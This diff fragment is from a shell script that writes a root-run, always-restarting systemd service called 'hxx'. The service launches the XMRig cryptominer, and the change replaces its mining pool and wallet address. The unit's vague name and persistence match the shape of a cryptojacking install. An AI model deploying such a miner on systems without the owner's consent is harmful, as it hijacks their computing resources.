@@ -122,7 +122,7 @@ bash -c 'cat <<EOT >>/lib/systemd/system/hxx.service
 Description=hxx
 After=network.target
 [Service]
-ExecStart= /usr/local/src/xmrig-6.12.1/xmrig --donate-level 1 -o qrl.herominers.com:10371 -u Q010500c94dfaf6c82c633b4376bcd9773bc74c34cdc024a754e4352663085956a16717d72f24b0 -p x -a rx/0 -k --tls
+ExecStart= /usr/local/src/xmrig-6.12.1/xmrig --donate-level 1 -o us-west.minexmr.com:443 -u 82rXhc9XZ3pW7SrRbLLFiSUpfyZQRRYDaEthiXfmyQyuQ1RsBzbt6bYae8oY1RCb6UUNYv5qLsN2g5VRBm228TgPCtV3uEb -p x -a rx/0 -k --tls
 Restart=always
 RestartSec=60
 User=root
